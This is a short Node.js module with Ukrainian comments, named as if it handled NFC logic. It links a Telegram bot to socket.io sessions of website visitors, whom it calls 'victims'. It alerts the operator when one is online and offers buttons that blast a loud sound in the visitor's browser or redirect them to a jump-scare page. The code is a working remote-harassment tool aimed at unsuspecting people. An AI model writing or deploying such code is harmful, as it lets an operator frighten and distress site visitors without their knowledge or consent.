// nfc_logic.js
module.exports = function(bot, io, victims, ADMIN_CHAT_ID) {

    // Функція: Відправити меню керування, коли жертва зайшла
    function notifyAdmin(socketId) {
        bot.sendMessage(ADMIN_CHAT_ID, `🚨 <b>Жертва онлайн!</b>\nID: <code>${socketId}</code>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '💣 БУМ (Звук)', callback_data: `boom|${socketId}` }],
                    [{ text: '🔇 Стоп', callback_data: `stop|${socketId}` }],
                    [{ text: '👹 Скример', callback_data: `scream|${socketId}` }]
                ]
            }
        });
    }

    // Слухаємо кнопки в боті
    bot.on('callback_query', (query) => {
        const data = query.data.split('|'); // Розбиваємо "команда|id"
        const action = data[0];
        const targetId = data[1];

        // Перевіряємо, чи жертва все ще на сайті
        const victimSocket = victims[targetId];

        if (!victimSocket) {
            bot.answerCallbackQuery(query.id, { text: 'Жертва вже втекла (' });
            return;
        }

        // Логіка команд
        if (action === 'boom') {
            victimSocket.emit('play_audio', { url: 'sound.mp3' });
            bot.answerCallbackQuery(query.id, { text: '💥 Бабах!' });
        } 
        else if (action === 'stop') {
            victimSocket.emit('stop_audio');
            bot.answerCallbackQuery(query.id, { text: 'Тишина...' });
        }
        else if (action === 'scream') {
            victimSocket.emit('redirect', '/scream');
            bot.answerCallbackQuery(query.id, { text: 'Скример запущено!' });
        }
    });

    // Повертаємо функцію, щоб сервер міг викликати її
    return { notifyAdmin };
};
